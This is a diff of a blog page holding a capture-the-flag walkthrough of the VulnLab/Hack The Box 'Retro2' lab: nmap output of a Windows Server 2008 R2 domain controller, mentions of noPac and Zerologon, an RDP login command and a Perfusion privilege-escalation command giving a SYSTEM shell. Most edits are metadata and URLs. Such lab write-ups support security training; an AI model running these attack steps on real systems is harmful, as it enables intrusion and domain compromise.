@@ -6,24 +6,25 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Vulnlab Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account AbuseIn this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate">
+    <meta name="description" content="Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account AbuseIn this comprehensive VulnLab - Hack The Box  walkthrough, I’l">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VL-Retro2">
-<meta property="og:url" content="https://panosoikogr.github.io/2025/03/14/VL-Retro2/index.html">
+<meta property="og:url" content="http://example.com/2025/03/14/VL-Retro2/index.html">
 <meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
-<meta property="og:description" content="Vulnlab Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account AbuseIn this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate">
+<meta property="og:description" content="Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account AbuseIn this comprehensive VulnLab - Hack The Box  walkthrough, I’l">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Retro2/guest0smb2.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Retro2/public-shares.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Retro2/john-crack.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Retro2/bloodhound.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Retro2/fs01-account.png">
-<meta property="article:published_time" content="2025-03-14T14:48:24.000Z">
-<meta property="article:modified_time" content="2025-05-23T10:42:15.180Z">
+<meta property="og:image" content="http://example.com/images/Retro2/guest0smb2.png">
+<meta property="og:image" content="http://example.com/images/Retro2/public-shares.png">
+<meta property="og:image" content="http://example.com/images/Retro2/john-crack.png">
+<meta property="og:image" content="http://example.com/images/Retro2/bloodhound.png">
+<meta property="og:image" content="http://example.com/images/Retro2/fs01-account.png">
+<meta property="article:published_time" content="2025-03-14T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:33:42.475Z">
 <meta property="article:author" content="Panosoiko">
-<meta property="article:tag" content="VL">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="VulnLab">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://panosoikogr.github.io/images/Retro2/guest0smb2.png">
+<meta name="twitter:image" content="http://example.com/images/Retro2/guest0smb2.png">
     
     
       
@@ -33,12 +34,12 @@
       
       
         
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
         
       
     
@@ -70,7 +71,7 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 8.0.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -90,7 +91,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
@@ -100,7 +101,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2025/03/16/VL-Baby2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/15/VL-Baby2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/03/11/VL-Retro/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -116,24 +117,24 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/14/VL-Retro2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&text=VL-Retro2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&is_video=false&description=VL-Retro2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Retro2&body=Check out this article: https://panosoikogr.github.io/2025/03/14/VL-Retro2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&name=VL-Retro2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&t=VL-Retro2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/14/VL-Retro2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/14/VL-Retro2/&text=VL-Retro2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/14/VL-Retro2/&is_video=false&description=VL-Retro2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Retro2&body=Check out this article: http://example.com/2025/03/14/VL-Retro2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/14/VL-Retro2/&name=VL-Retro2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/14/VL-Retro2/&t=VL-Retro2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Fast exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">1.3.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-number">1.3.1.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-number">1.3.2.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GenericWrite"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">GenericWrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AddMember"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">AddMember</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Priv Escalation</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Hack-The-Box-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Fast exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">1.3.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-number">1.3.1.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-number">1.3.2.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GenericWrite"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">GenericWrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AddMember"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">AddMember</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Priv Escalation</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -158,7 +159,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-03-14T14:48:24.000Z" class="dt-published" itemprop="datePublished">2025-03-14</time>
+        <time datetime="2025-03-14T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-03-14</time>
         
       
     </div>
@@ -169,7 +170,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
     </div>
 
 
@@ -178,7 +179,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Vulnlab-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><a href="#Vulnlab-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse" class="headerlink" title="Vulnlab Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse"></a>Vulnlab Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</h1><p>In this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Retro2” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and password-protected Access database cracking, we’ll progress through LDAP enumeration, machine account password manipulation, and ultimately achieve SYSTEM-level access via Windows Registry RPC endpoint mapper privilege escalation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, database credential extraction, machine account exploitation, GenericWrite abuse for password resets, group membership manipulation, and leveraging legacy Windows vulnerabilities for local privilege escalation. The techniques demonstrated highlight common security misconfigurations in older Windows environments that penetration testers should look for during enterprise assessments.</p>
+    <h1 id="Vulnlab-Hack-The-Box-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><a href="#Vulnlab-Hack-The-Box-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse" class="headerlink" title="Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse"></a>Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</h1><p>In this comprehensive VulnLab - Hack The Box  walkthrough, I’ll demonstrate how to penetrate the “Retro2” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and password-protected Access database cracking, we’ll progress through LDAP enumeration, machine account password manipulation, and ultimately achieve SYSTEM-level access via Windows Registry RPC endpoint mapper privilege escalation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, database credential extraction, machine account exploitation, GenericWrite abuse for password resets, group membership manipulation, and leveraging legacy Windows vulnerabilities for local privilege escalation. The techniques demonstrated highlight common security misconfigurations in older Windows environments that penetration testers should look for during enterprise assessments.</p>
 <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      REASON          VERSION</span><br><span class="line">53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)</span><br><span class="line">88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</span><br><span class="line">464/tcp   open  kpasswd5?    syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-11T18:29:27</span><br><span class="line">|_  start_date: 2025-03-11T18:27:35</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 22122/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 47750/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 39335/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 23565/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: BLN01</span><br><span class="line">|   NetBIOS computer name: BLN01\x00</span><br><span class="line">|   Domain name: retro2.vl</span><br><span class="line">|   Forest name: retro2.vl</span><br><span class="line">|   FQDN: BLN01.retro2.vl</span><br><span class="line">|_  System time: 2025-03-11T19:29:28+01:00</span><br><span class="line">|_clock-skew: mean: -2h19m57s, deviation: 34m36s, median: -1h59m59s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</p>
 <h2 id="Fast-exploit"><a href="#Fast-exploit" class="headerlink" title="Fast exploit"></a>Fast exploit</h2><p>We can see that its Windows Server 2008 R2 trying the most basic exploits for this version we see that its vulnerable to <code>nopac</code> and <code>zerologon</code></p>
@@ -218,11 +219,11 @@
 <p>Then we can just RDP to the machine:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.70.92 /u:&#x27;ldapreader&#x27; /p:&#x27;&lt;REDACTED&gt;&#x27; /d:retro2.vl /tls-seclevel:0</span><br></pre></td></tr></table></figure>
 
-<h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><p>There is a great blog post by <a target="_blank" rel="noopener" href="https://itm4n.github.io/">itm4n</a> on a no-fix vulnerability<br>    <a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a><br>    <a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></p>
+<h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><p>There is a great blog post by <a target="_blank" rel="noopener" href="https://itm4n.github.io/">itm4n</a> on a no-fix vulnerability<br>	<a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a><br>	<a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></p>
 <p>Now with a tool named <a target="_blank" rel="noopener" href="https://github.com/itm4n/Perfusion">Perfusion</a> we can get a system shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Perfusion.exe -c cmd -i</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f" title="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f">https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f</a></p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f" title="https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;bec17ffc-be95-49d1-915e-35c53826e85f">https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f</a></p>
 
   </div>
 </article>
@@ -244,7 +245,7 @@
         
           <li><a href="/search/">Search</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/tags/">tags</a></li>
         
           <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
         
@@ -254,23 +255,23 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Fast exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">1.3.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-number">1.3.1.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-number">1.3.2.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GenericWrite"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">GenericWrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AddMember"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">AddMember</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Priv Escalation</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Hack-The-Box-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Fast exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">1.3.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-number">1.3.1.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-number">1.3.2.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GenericWrite"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">GenericWrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AddMember"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">AddMember</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Priv Escalation</span></a></li></ol></li></ol>
       </div>
     
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/14/VL-Retro2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&text=VL-Retro2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&is_video=false&description=VL-Retro2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Retro2&body=Check out this article: https://panosoikogr.github.io/2025/03/14/VL-Retro2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&name=VL-Retro2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/14/VL-Retro2/&t=VL-Retro2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/14/VL-Retro2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/14/VL-Retro2/&text=VL-Retro2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
